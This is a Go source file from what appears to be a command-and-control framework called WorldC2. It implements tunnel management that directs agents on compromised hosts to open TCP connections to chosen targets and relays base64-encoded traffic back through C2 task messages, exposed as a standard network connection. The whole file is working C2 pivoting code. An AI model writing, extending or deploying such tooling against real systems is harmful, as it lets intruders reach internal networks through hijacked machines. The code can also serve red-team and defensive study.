package c2

import (
	"encoding/base64"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/Ruby570bocadito/WorldC2/src/go/internal/c2/session"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/proto"
)

// TunnelManager handles bidirectional data tunnels through agent sessions.
type TunnelManager struct {
	tunnels map[string]*Tunnel
	mu      sync.RWMutex
}

// Tunnel represents an active TCP tunnel through an agent.
type Tunnel struct {
	ID        string
	Session   *session.Session
	Target    string
	dataCh    chan []byte
	closeCh   chan struct{}
	running   bool
	mu        sync.Mutex
	bytesRx   uint64
	bytesTx   uint64
}

// NewTunnelManager creates a tunnel manager.
func NewTunnelManager() *TunnelManager {
	return &TunnelManager{
		tunnels: make(map[string]*Tunnel),
	}
}

// OpenTunnel sends a tunnel_open command to the agent and returns a net.Conn.
func (tm *TunnelManager) OpenTunnel(sess *session.Session, target string) (net.Conn, error) {
	id := fmt.Sprintf("tun-%x", time.Now().UnixNano())

	t := &Tunnel{
		ID:      id,
		Session: sess,
		Target:  target,
		dataCh:  make(chan []byte, 128),
		closeCh: make(chan struct{}),
		running: true,
	}

	tm.mu.Lock()
	tm.tunnels[id] = t
	tm.mu.Unlock()

	cmd := fmt.Sprintf("tunnel_open:%s:%s", id, target)
	task := &proto.Task{
		TaskId:     "tun-open-" + id,
		Command:    cmd,
		TimeoutSec: 10,
	}

	if err := sess.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_TASK, task); err != nil {
		tm.Close(id)
		return nil, fmt.Errorf("send tunnel open: %w", err)
	}

	return &tunnelConn{tunnel: t, tm: tm}, nil
}

// HandleTunnelResult processes an agent's tunnel-related response.
func (tm *TunnelManager) HandleTunnelResult(result *proto.TaskResult) {
	output := result.Output
	if output == "" {
		return
	}

	tm.mu.RLock()
	defer tm.mu.RUnlock()

	for _, t := range tm.tunnels {
		if !strings.Contains(output, t.ID) {
			continue
		}
		if strings.HasPrefix(output, "tunnel_data:") {
			parts := strings.SplitN(output, ":", 3)
			if len(parts) == 3 {
				data, err := base64.StdEncoding.DecodeString(parts[2])
				if err == nil && len(data) > 0 {
					log.Printf("[TUNNEL] Tunnel %s received %d bytes", t.ID, len(data))
					select {
					case t.dataCh <- data:
					default:
						log.Printf("[TUNNEL] Tunnel %s dataCh full, dropping", t.ID)
					}
				}
			}
		} else if strings.HasPrefix(output, "tunnel_err:") {
			tm.Close(t.ID)
		}
		break
	}
}

// SendData sends data from C2 to the agent through a tunnel.
func (tm *TunnelManager) SendData(tunnelID string, data []byte) error {
	tm.mu.RLock()
	t, ok := tm.tunnels[tunnelID]
	tm.mu.RUnlock()
	if !ok || !t.running {
		return fmt.Errorf("tunnel not found or closed")
	}

	encoded := base64.StdEncoding.EncodeToString(data)
	cmd := fmt.Sprintf("tunnel_data:%s:%s", tunnelID, encoded)
	task := &proto.Task{
		TaskId:  "tun-data-" + tunnelID,
		Command: cmd,
	}
	return t.Session.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_TASK, task)
}

// Close closes a tunnel (sends close to agent and cleans up).
func (tm *TunnelManager) Close(id string) {
	tm.mu.Lock()
	t, ok := tm.tunnels[id]
	if ok {
		delete(tm.tunnels, id)
	}
	tm.mu.Unlock()

	if ok && t.running {
		t.running = false
		close(t.closeCh)
		// Send close to agent
		cmd := fmt.Sprintf("tunnel_close:%s", id)
		task := &proto.Task{
			TaskId:  "tun-close-" + id,
			Command: cmd,
		}
		t.Session.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_TASK, task)
	}
}

// --- tunnelConn implements net.Conn over C2 tunnel ---

type tunnelConn struct {
	tunnel  *Tunnel
	tm      *TunnelManager
	readBuf []byte
}

func (c *tunnelConn) Read(b []byte) (int, error) {
	if len(c.readBuf) > 0 {
		n := copy(b, c.readBuf)
		c.readBuf = c.readBuf[n:]
		return n, nil
	}

	select {
	case data, ok := <-c.tunnel.dataCh:
		if !ok {
			return 0, fmt.Errorf("tunnel closed")
		}
		n := copy(b, data)
		if n < len(data) {
			c.readBuf = data[n:]
		}
		return n, nil
	case <-c.tunnel.closeCh:
		return 0, fmt.Errorf("tunnel closed")
	}
}

func (c *tunnelConn) Write(b []byte) (int, error) {
	if !c.tunnel.running {
		return 0, fmt.Errorf("tunnel closed")
	}
	if err := c.tm.SendData(c.tunnel.ID, b); err != nil {
		return 0, err
	}
	return len(b), nil
}

func (c *tunnelConn) Close() error {
	c.tm.Close(c.tunnel.ID)
	return nil
}

func (c *tunnelConn) LocalAddr() net.Addr  { return addrAny("c2-tunnel") }
func (c *tunnelConn) RemoteAddr() net.Addr { return addrAny(c.tunnel.Target) }
func (c *tunnelConn) SetDeadline(t time.Time) error      { return nil }
func (c *tunnelConn) SetReadDeadline(t time.Time) error  { return nil }
func (c *tunnelConn) SetWriteDeadline(t time.Time) error { return nil }

type addrAny string
func (a addrAny) Network() string { return "tcp" }
func (a addrAny) String() string  { return string(a) }
